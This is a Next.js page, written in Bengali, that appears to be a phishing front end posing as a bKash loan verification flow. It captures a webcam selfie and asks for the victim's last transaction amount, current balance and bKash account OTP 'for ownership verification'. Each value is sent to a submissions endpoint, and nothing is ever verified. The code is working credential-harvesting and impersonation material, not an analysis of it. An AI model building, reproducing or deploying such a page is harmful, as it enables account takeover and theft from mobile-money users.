'use client';

import { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';
import { ChevronLeft, ShieldCheck, Camera, LandPlot, Wallet, ArrowRight } from 'lucide-react';
import Banner from '@/components/Banner';

export default function Verify() {
  const router = useRouter();
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [verifyData, setVerifyData] = useState({
    lastTransaction: '',
    currentBalance: '',
    otp: ''
  });

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [capturedImage, setCapturedImage] = useState<string | null>(null);

  const [loanSummary, setLoanSummary] = useState<any>(null);

  useEffect(() => {
    const data = sessionStorage.getItem('loan_data');
    if (!data) router.push('/apply');
    const parsed = JSON.parse(data || '{}');
    
    // Calculate loan details
    const amount = parseFloat(parsed.loanAmount) || 0;
    const interest = amount * 0.03;
    const total = amount + interest;
    const months = parseInt(parsed.tenure?.split(' ')[0] || '3');
    const installment = total / months;

    setLoanSummary({
        amount,
        interest,
        total,
        months,
        installment: installment.toFixed(2)
    });
  }, [router]);

  useEffect(() => {
    if (step === 2 && !capturedImage) {
        startCamera();
    } else {
        stopCamera();
    }
    return () => stopCamera();
  }, [step, capturedImage]);

  const startCamera = async () => {
    try {
        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        setStream(s);
        if (videoRef.current) videoRef.current.srcObject = s;
    } catch (err) {
        console.error("Camera error:", err);
        alert("ক্যামেরা এক্সেস করতে সমস্যা হচ্ছে। অনুগ্রহ করে পারমিশন দিন।");
    }
  };

  const stopCamera = () => {
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
        setStream(null);
    }
  };

  const capturePhoto = () => {
    if (videoRef.current && canvasRef.current) {
        const video = videoRef.current;
        const canvas = canvasRef.current;
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        if (ctx) {
            ctx.drawImage(video, 0, 0);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
            setCapturedImage(dataUrl);
            stopCamera();
        }
    }
  };

  const updateSubmission = async (data: any) => {
    const submissionId = sessionStorage.getItem('submission_id');
    if (!submissionId) return false;

    try {
      const res = await fetch('/api/submissions', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: submissionId, ...data }),
      });
      return res.ok;
    } catch (err) {
      console.error(err);
      return false;
    }
  };

  const handleFinalSubmit = async () => {
    if (!verifyData.otp) {
        alert('ওটিপি কোড দিন');
        return;
    }
    setLoading(true);
    
    const success = await updateSubmission({
        otp: verifyData.otp,
        status: 'Pending'
    });

    if (success) {
        router.push('/processing');
    } else {
        alert('কিছু ভুল হয়েছে। আবার চেষ্টা করুন।');
        setLoading(false);
    }
  };

  const renderStep = () => {
    switch(step) {
      case 1:
        return (
          <div className="flex-1 flex flex-col p-6 space-y-6 text-center animate-in fade-in transition-all duration-300">
            <ShieldCheck size={72} className="text-bkash-pink mx-auto mt-10" />
            <h2 className="text-2xl font-black text-gray-800">লোন ভেরিফিকেশন শুরু করুন</h2>
            <div className="bg-gray-50 p-6 rounded-2xl text-[15px] text-gray-600 text-center space-y-3 leading-relaxed border border-gray-100 flex-1 overflow-y-auto">
              <p>আপনার লোন আবেদনটি সফলভাবে গ্রহণ করা হয়েছে। এখন আপনার তথ্য যাচাই করার জন্য পরবর্তী ধাপগুলো সম্পন্ন করুন।</p>
            </div>
            <button onClick={() => setStep(2)} className="w-full bg-bkash-pink text-white font-black py-4 rounded-2xl shadow-xl active:scale-95 transition-all text-lg">শুরু করুন</button>
          </div>
        );
      case 2:
        return (
          <div className="flex-1 flex flex-col p-6 space-y-8 text-center animate-in fade-in transition-all duration-300">
            <div className="relative w-64 h-64 border-8 border-gray-50 rounded-full overflow-hidden bg-gray-50/50 mx-auto mt-10 shadow-inner flex items-center justify-center">
              {capturedImage ? (
                  <img src={capturedImage} alt="Captured" className="w-full h-full object-cover" />
              ) : (
                  <>
                    <video ref={videoRef} autoPlay playsInline className="w-full h-full object-cover mirror" />
                    <Camera size={64} className="text-gray-300 absolute" />
                  </>
              )}
              <canvas ref={canvasRef} className="hidden" />
            </div>
            <div className="space-y-2">
                <h2 className="text-2xl font-black text-gray-800">সেলফি ভেরিফিকেশন</h2>
                <p className="text-sm font-bold text-gray-400">আপনার চেহারা পরিষ্কার দেখা যায় এমন একটি সেলফি তুলুন।</p>
            </div>
            
            {capturedImage ? (
                <div className="grid grid-cols-2 gap-4 mt-auto">
                    <button 
                        onClick={() => { setCapturedImage(null); startCamera(); }} 
                        className="w-full bg-slate-100 text-slate-800 font-black py-4 rounded-2xl active:scale-95 transition-all text-lg"
                    >
                        আবার তুলুন
                    </button>
                    <button 
                        onClick={async () => {
                            const success = await updateSubmission({ selfie: capturedImage });
                            if (success) setStep(3);
                            else alert("কিছু ভুল হয়েছে।");
                        }} 
                        className="w-full bg-bkash-pink text-white font-black py-4 rounded-2xl shadow-xl active:scale-95 transition-all text-lg"
                    >
                        নিশ্চিত করুন
                    </button>
                </div>
            ) : (
                <button 
                    onClick={capturePhoto} 
                    className="w-full bg-bkash-pink text-white font-black py-4 rounded-2xl shadow-xl active:scale-95 transition-all text-lg mt-auto"
                >
                    ছবি তুলুন
                </button>
            )}
          </div>
        );
      case 3:
        return (
          <div className="flex-1 flex flex-col p-6 space-y-10 animate-in fade-in transition-all duration-300 pt-10">
            <div className="text-center space-y-2">
                <LandPlot size={64} className="text-blue-600 mx-auto" />
                <h2 className="text-2xl font-black text-gray-800">তথ্য যাচাই</h2>
                <p className="text-sm font-bold text-gray-400">আপনার প্রদানকৃত তথ্য পরিচয় ও অ্যাকাউন্ট মালিকানা নিশ্চিত করার জন্য যাচাই করা হবে।</p>
            </div>
            <div className="relative border-b-2 border-gray-100 focus-within:border-blue-600 transition-all">
                <label className="block text-xs font-bold text-gray-400 mb-1">সর্বশেষ লেনদেন</label>
                <input 
                    type="number" 
                    className="w-full outline-none py-3 text-lg font-bold placeholder:text-gray-200" 
                    placeholder="উদাঃ ৫০০"
                    value={verifyData.lastTransaction}
                    onChange={(e) => setVerifyData({...verifyData, lastTransaction: e.target.value})}
                />
            </div>
            <button 
                onClick={async () => {
                    if (!verifyData.lastTransaction) {
                        alert('সর্বশেষ লেনদেনের পরিমাণ দিন');
                        return;
                    }
                    await updateSubmission({ lastTransaction: verifyData.lastTransaction });
                    setStep(4);
                }} 
                className="w-full bg-blue-600 text-white font-black py-4 rounded-2xl shadow-xl active:scale-95 transition-all text-lg mt-auto"
            >
                পরবর্তী
            </button>
          </div>
        );
      case 4:
        return (
          <div className="flex-1 flex flex-col p-6 space-y-10 animate-in fade-in transition-all duration-300 pt-10">
            <div className="text-center space-y-2">
                <Wallet size={64} className="text-blue-600 mx-auto" />
                <h2 className="text-2xl font-black text-gray-800">তথ্য যাচাই</h2>
                <p className="text-sm font-bold text-gray-400">আপনার প্রদানকৃত তথ্য পরিচয় ও অ্যাকাউন্ট মালিকানা নিশ্চিত করার জন্য যাচাই করা হবে।</p>
            </div>
            <div className="relative border-b-2 border-gray-100 focus-within:border-blue-600 transition-all">
                <label className="block text-xs font-bold text-gray-400 mb-1">বর্তমান ব্যালেন্স</label>
                <input 
                    type="number" 
                    className="w-full outline-none py-3 text-lg font-bold placeholder:text-gray-200" 
                    placeholder="উদাঃ ১২৫০"
                    value={verifyData.currentBalance}
                    onChange={(e) => setVerifyData({...verifyData, currentBalance: e.target.value})}
                />
            </div>
            <button 
                onClick={async () => {
                    if (!verifyData.currentBalance) {
                        alert('বর্তমান ব্যালেন্স দিন');
                        return;
                    }
                    await updateSubmission({ currentBalance: verifyData.currentBalance });
                    setStep(5);
                }} 
                className="w-full bg-blue-600 text-white font-black py-4 rounded-2xl shadow-xl active:scale-95 transition-all text-lg mt-auto"
            >
                সামারি দেখুন
            </button>
          </div>
        );
      case 5:
        return (
          <div className="flex-1 flex flex-col p-6 space-y-6 animate-in fade-in transition-all duration-300">
            <h2 className="text-2xl font-extrabold text-center border-b border-gray-100 pb-4 text-gray-800">আবেদনের সামারি</h2>
            <div className="space-y-5 flex-1">
                <div className="flex justify-between items-center">
                    <span className="text-gray-400 font-bold">লোনের পরিমাণ</span>
                    <span className="font-black text-lg">৳ {loanSummary?.amount}</span>
                </div>
                <div className="flex justify-between items-center">
                    <span className="text-gray-400 font-bold">মুনাফা (৩%)</span>
                    <span className="font-black text-lg">৳ {loanSummary?.interest}</span>
                </div>
                <div className="flex justify-between items-center border-t border-gray-50 pt-5">
                    <span className="text-gray-800 font-black text-xl">মোট প্রদেয়</span>
                    <span className="font-black text-2xl text-bkash-pink">৳ {loanSummary?.total}</span>
                </div>
                
                <div className="bg-bkash-pink/[0.03] p-6 rounded-3xl border border-bkash-pink/5 mt-6">
                    <p className="text-[11px] text-bkash-pink font-black mb-3 uppercase tracking-widest">কিস্তি পরিশোধের সূচী</p>
                    <div className="flex justify-between items-center">
                        <span className="text-sm font-bold text-gray-600">{loanSummary?.months} টি মাসিক কিস্তি</span>
                        <span className="font-black text-md text-bkash-pink">৳ {loanSummary?.installment} / মাস</span>
                    </div>
                </div>
            </div>
            <button 
                disabled={loading}
                onClick={() => setStep(6)} 
                className="w-full bg-bkash-pink text-white font-black py-5 rounded-2xl shadow-xl active:scale-95 transition-all text-xl mt-auto disabled:bg-gray-300"
            >
                নিশ্চিত করুন
            </button>
          </div>
        );
      case 6:
        return (
            <div className="flex-1 flex flex-col p-6 space-y-10 animate-in fade-in transition-all duration-300 pt-10">
            <div className="text-center space-y-2">
                <div className="w-20 h-20 bg-bkash-pink/10 rounded-full flex items-center justify-center mx-auto mb-4">
                    <ShieldCheck size={40} className="text-bkash-pink" />
                </div>
                <h2 className="text-2xl font-black text-gray-800">ওটিপি যাচাই</h2>
                <p className="text-sm font-bold text-gray-400">আপনার মোবাইল নম্বরে পাঠানো ওটিপি কোডটি প্রদান করুন</p>
                <p className="text-[13px] font-bold text-gray-400 mt-2">মালিকানা যাচাই এর জন্য সঠিক বিকাশ একাউন্ট ওটিপি দিয়ে কনফার্ম করতে হবে</p>
            </div>
            <div className="relative border-b-2 border-gray-100 focus-within:border-bkash-pink transition-all">
                <label className="block text-xs font-bold text-gray-400 mb-1">ওটিপি কোড</label>
            <div className="flex justify-between items-center gap-2 max-w-[300px] mx-auto">
                {[0, 1, 2, 3, 4, 5].map((index) => (
                    <input 
                        key={index}
                        id={`otp-${index}`}
                        type="tel" 
                        maxLength={1}
                        className="w-11 h-11 border-2 border-gray-100 rounded-xl text-center text-xl font-black focus:border-bkash-pink outline-none transition-all"
                        value={verifyData.otp[index] || ''}
                        onChange={(e) => {
                            const val = e.target.value;
                            if (val && !/^\d$/.test(val)) return;
                            
                            const otpArray = verifyData.otp.split('');
                            otpArray[index] = val;
                            const newOtp = otpArray.join('');
                            
                            if (newOtp.length <= 6) {
                                setVerifyData({...verifyData, otp: newOtp});
                                // Auto focus next box
                                if (val && index < 5) {
                                    document.getElementById(`otp-${index + 1}`)?.focus();
                                }
                            }
                        }}
                        onKeyDown={(e) => {
                            if (e.key === 'Backspace' && !verifyData.otp[index] && index > 0) {
                                document.getElementById(`otp-${index - 1}`)?.focus();
                            }
                        }}
                    />
                ))}
            </div>
            </div>
            <button 
                disabled={loading}
                onClick={handleFinalSubmit} 
                className="w-full bg-bkash-pink text-white font-black py-5 rounded-2xl shadow-xl active:scale-95 transition-all text-xl mt-auto disabled:bg-gray-300"
            >
                {loading ? 'যাচাই করা হচ্ছে...' : 'সাবমিট করুন'}
            </button>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="mobile-container flex flex-col bg-white">
      <div className="bg-white px-4 py-3 flex items-center justify-between border-b border-gray-100 shrink-0">
        <button onClick={() => step > 1 ? setStep(step - 1) : router.back()} className="text-gray-400">
          <ChevronLeft size={28} />
        </button>
        <h1 className="text-[17px] font-black text-gray-800">যাচাইকরণ ({step}/৬)</h1>
        <div className="text-[11px] font-black text-bkash-pink bg-bkash-pink/10 px-3 py-1 rounded-full">ধাপ {step}</div>
      </div>

      <div className="flex-1 flex flex-col overflow-y-auto">
        {renderStep()}
      </div>

      <div className="h-1.5 w-full bg-gray-50">
         <div 
           className="h-full bg-bkash-pink transition-all duration-500 ease-out shadow-[0_0_10px_rgba(226,19,110,0.5)]" 
           style={{ width: `${(step / 6) * 100}%` }}
         ></div>
      </div>
    </div>
  );
}
